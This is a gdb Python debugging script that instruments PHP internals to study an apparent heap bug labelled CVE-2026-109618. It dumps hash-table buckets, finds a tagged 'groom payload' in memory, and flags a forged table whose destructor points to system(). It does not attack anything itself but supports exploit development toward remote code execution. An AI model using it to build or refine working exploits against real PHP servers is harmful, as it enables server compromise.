# ht_dump.py -- gdb (python) probe for the CVE-2026-109618 leftover bucket.
#
# Sourced into gdb before `run`.  Two pending breakpoints, both silent and
# auto-continuing:
#
#   HugeKey       zend_hash_str_add_or_update() with len > 1 MiB
#                 -> prints the destination HashTable and, crucially, the
#                    bucket index the parser is about to consume (nNumUsed).
#   ShutdownDump  php_request_shutdown()
#                 -> finds the groom payload in the heap (tag search) and
#                    prints the memory around it, so the bucket geometry can
#                    be read off directly.
#
# Type-free on purpose: the shipped libphp.so carries a symbol table but no
# DWARF, so all structure access is raw offsets.
#
#   zend_string : gc(8) h(8) len(8) val[]
#   Bucket      : val(16) h(8) key(8)                        = 0x20
#   zend_array  : gc(8) flags(4) nTableMask(4) arData(8) nNumUsed(4)
#                 nNumOfElements(4) nTableSize(4) nInternalPointer(4)
#                 nNextFreeElement(8) pDestructor(8)

import struct

import gdb

BUCKET = 32
SYSPRINT = []


def _inf():
    return gdb.selected_inferior()


def rd(addr, n):
    return bytes(_inf().read_memory(int(addr), n))


def u32(addr):
    return struct.unpack("<I", rd(addr, 4))[0]


def u64(addr):
    return struct.unpack("<Q", rd(addr, 8))[0]


def ht_header(ht):
    return ("ht=0x%x flags=0x%x nTableMask=0x%x arData=0x%x nNumUsed=%d "
            "nNumOfElements=%d nTableSize=%d pDestructor=0x%x"
            % (ht, u32(ht + 8), u32(ht + 0xC), u64(ht + 0x10), u32(ht + 0x18),
               u32(ht + 0x1C), u32(ht + 0x20), u64(ht + 0x30)))


def dump_around(addr, before=0x40, after=0x160):
    start = (addr - before) & ~7
    for row in range(0, before + after, 16):
        a = start + row
        try:
            raw = rd(a, 16)
        except gdb.MemoryError:
            break
        print("  0x%x  %s  |%s|"
              % (a, raw.hex(" ", 8),
                 "".join(chr(b) if 32 <= b < 127 else "." for b in raw)))


def maps(pid):
    out = []
    with open("/proc/%d/maps" % pid, "r") as fh:
        for line in fh:
            parts = line.split()
            lo, hi = parts[0].split("-")
            if "w" not in parts[1]:
                continue
            out.append((int(lo, 16), int(hi, 16)))
    return out


def find_pattern(needle, limit_mb=256):
    pid = gdb.selected_inferior().pid
    hits = []
    scanned = 0
    for lo, hi in maps(pid):
        size = hi - lo
        if size <= 0 or size > 64 * 1024 * 1024:
            continue
        off = lo
        while off < hi:
            n = min(0x100000, hi - off)
            try:
                chunk = rd(off, n)
            except gdb.MemoryError:
                off += n
                continue
            pos = chunk.find(needle)
            while pos != -1:
                hits.append(off + pos)
                pos = chunk.find(needle, pos + 1)
            off += n
        scanned += size
        if scanned > limit_mb * 1024 * 1024:
            break
    return hits


class HugeKey(gdb.Breakpoint):
    """Exported entry point used by the request parser for long field names."""

    def __init__(self):
        gdb.execute("set breakpoint pending on", to_string=True)
        super(HugeKey, self).__init__("zend_hash_str_add_or_update",
                                      internal=False)

    def stop(self):
        fr = gdb.selected_frame()
        ht = int(fr.read_register("x0"))
        key = int(fr.read_register("x1"))
        ln = int(fr.read_register("x2"))
        if ln < (1 << 20):
            return False
        print("\n===== HUGE KEY =====")
        try:
            print("len=%d key_head=%r" % (ln, rd(key, 16)))
            print(ht_header(ht))
            ar = u64(ht + 0x10)
            for i in range(min(u32(ht + 0x18) + 1, 12)):
                b = ar + BUCKET * i
                raw = rd(b, BUCKET)
                kp = struct.unpack("<Q", raw[24:32])[0]
                print("  pre[%d] 0x%x ptr=0x%x type=0x%x h=0x%x key=0x%x raw=%s"
                      % (i, b, struct.unpack("<Q", raw[0:8])[0],
                         struct.unpack("<I", raw[8:12])[0],
                         struct.unpack("<Q", raw[16:24])[0], kp, raw.hex()))
        except gdb.MemoryError as exc:
            print("read error: %r" % (exc,))
        print("===== END HUGE KEY =====")
        return False


class ArrDestroy(gdb.Breakpoint):
    """Fires for every array destroyed at request shutdown.  The one whose
    bucket array contains the groom payload is $_POST -- that is where the
    leftover bucket index and arData address can be read off."""

    def __init__(self):
        gdb.execute("set breakpoint pending on", to_string=True)
        super(ArrDestroy, self).__init__("zend_array_destroy", internal=False)

    def stop(self):
        fr = gdb.selected_frame()
        ht = int(fr.read_register("x0"))
        try:
            ar = u64(ht + 0x10)
            nu = u32(ht + 0x18)
            nts = u32(ht + 0x20)
        except gdb.MemoryError:
            return False
        if ar == 0 or nts == 0 or nts > 4096:
            return False
        span = min(nts * BUCKET, 0x20000)
        try:
            blob = rd(ar, span)
        except gdb.MemoryError:
            try:
                blob = rd(ar, min(span, 0x1000))
            except gdb.MemoryError:
                return False
        blob_off = 0
        found = []
        pos = blob.find(b"SELFREF")
        while pos != -1:
            found.append((pos + blob_off, blob[pos:pos + 8]))
            pos = blob.find(b"SELFREF", pos + 8)
        if not found:
            # On the exploit request the payload carries no tags, but the fake
            # table is still recognisable: its pDestructor is system(3).
            try:
                if u64(ht + 0x30) == int(gdb.parse_and_eval("&system")):
                    print("\n===== FAKE TABLE (pDestructor = system) =====")
                    print(ht_header(ht))
                    print("  ARDATA 0x%x NUMUSED %d" % (ar, nu))
                    for i in range(min(nu + 1, 4)):
                        raw = rd(ar + BUCKET * i, BUCKET)
                        print("  fakebucket[%d] 0x%x raw=%s cmd=%r"
                              % (i, ar + BUCKET * i, raw.hex(),
                                 raw[:24].split(b"\x00")[0]))
                    print("===== END FAKE TABLE =====")
            except gdb.MemoryError:
                pass
            return False
        print("\n===== TARGET ARRAY =====")
        print(ht_header(ht))
        for off, tag in found[:12]:
            try:
                idx = int(tag[7:8])
            except ValueError:
                idx = -1
            print("  tag %r at arData+0x%x (bucket %d) -> payload_base 0x%x, "
                  "p0=0x%x"
                  % (tag, off, off // BUCKET, ar + off - 24 - 32 * idx,
                     24 + 32 * idx - off))
        print("  ARDATA 0x%x NUMUSED %d" % (ar, nu))
        for i in range(min(nu + 1, 12)):
            b = ar + BUCKET * i
            try:
                raw = rd(b, BUCKET)
            except gdb.MemoryError:
                break
            print("  bucket[%d] 0x%x ptr=0x%x type=0x%x h=0x%x key=0x%x raw=%s"
                  % (i, b, struct.unpack("<Q", raw[0:8])[0],
                     struct.unpack("<I", raw[8:12])[0],
                     struct.unpack("<Q", raw[16:24])[0],
                     struct.unpack("<Q", raw[24:32])[0], raw.hex()))
        print("===== END TARGET ARRAY =====")
        return False


class ShutdownDump(gdb.Breakpoint):
    def __init__(self):
        gdb.execute("set breakpoint pending on", to_string=True)
        super(ShutdownDump, self).__init__("php_request_shutdown",
                                           internal=False)

    def stop(self):
        print("\n===== HT DUMP =====")
        try:
            if not any("SYSTEM" in l for l in SYSPRINT):
                SYSPRINT.append("SYSTEM 0x%x"
                                % int(gdb.parse_and_eval("&system")))
                print(SYSPRINT[-1])
            tags = find_pattern(b"SELFREF")
            if tags:
                tags.sort()
                print("TAGS %s" % [hex(t) for t in tags][:16])
                print("PAYLOAD_BASE 0x%x" % (tags[0] - 24))
                dump_around(tags[0] - 24, 0x40, 0x1A0)
            else:
                print("TAGS none")
        except Exception as exc:
            print("DUMP error: %r" % (exc,))
        print("===== END HT DUMP =====")
        return False


HugeKey()
ArrDestroy()
ShutdownDump()
print("ht_dump.py armed (zend_hash_str_add_or_update, php_request_shutdown)")
